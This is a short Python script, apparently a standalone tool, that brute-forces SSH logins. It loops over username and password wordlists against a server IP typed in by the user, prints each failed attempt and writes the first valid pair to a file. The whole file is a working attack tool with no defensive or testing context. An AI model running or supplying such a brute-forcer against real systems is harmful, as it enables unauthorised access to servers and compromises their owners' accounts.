import os
import paramiko

data_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
ip_address = input("Enter the IP address of the server: ")

with open(os.path.join(data_folder, "Usernames.txt"), "r") as f:
    usernames = f.read().splitlines()
with open(os.path.join(data_folder, "Passwords.txt"), "r") as f:
    passwords = f.read().splitlines()

valid_file = open(os.path.join(data_folder, "Valid.txt"), "w")
num_combinations_tried = 0

for username in usernames:
    for password in passwords:
        num_combinations_tried += 1
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip_address, username=username, password=password)
            print(f"Valid credentials found: {username}:{password} and saved in 'Data/Valid.txt'")
            valid_file.write(f"{username}:{password}\n")
            ssh.close()
            valid_file.close()
            exit()
        except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
            print(f"[INVALID {num_combinations_tried}] {username}:{password}")
        ssh.close()

print("Could not find valid credentials.")
valid_file.close()